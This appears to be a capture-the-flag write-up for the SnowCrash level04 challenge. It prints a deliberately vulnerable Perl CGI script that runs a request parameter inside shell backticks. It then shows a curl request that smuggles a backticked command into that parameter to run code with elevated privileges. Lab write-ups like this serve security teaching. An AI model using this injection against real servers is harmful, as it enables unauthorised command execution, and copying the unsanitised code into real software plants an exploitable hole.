# Level04
This time we are given a Perl script

![image](https://github.com/user-attachments/assets/5a276f3c-077c-4f13-b572-df191e644603)

![image](https://github.com/user-attachments/assets/afec7e89-9de1-4216-9479-25f7c7e55e12)

It has the SUID bit set like the last time. So we will try to exploit the priviliges of flag04 somehow. Let's run it,

![image](https://github.com/user-attachments/assets/085d513d-7dc6-4b2c-89ef-8574d0d3f4c1)

What is it trying to achieve exactly? Let's read the file contents:

![image](https://github.com/user-attachments/assets/c888db70-7096-4545-a2ad-dbf77416d8d4)

```
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```
After a crash course in perl [subroutines](https://www.tutorialspoint.com/perl/perl_subroutines.htm) and the [CGI](https://www.perl.com/article/perl-and-cgi/) module we see that we are provided a neatly vulnerable code.

```
level04@SnowCrash:~$ curl 'http://localhost:4747/level04.pl?x=`getflag`'
```
![image](https://github.com/user-attachments/assets/390db6a7-889b-4a9b-99f1-7a325288c15b)

![image](https://github.com/user-attachments/assets/f252564f-cfb3-4278-976d-06e83465f6b9)


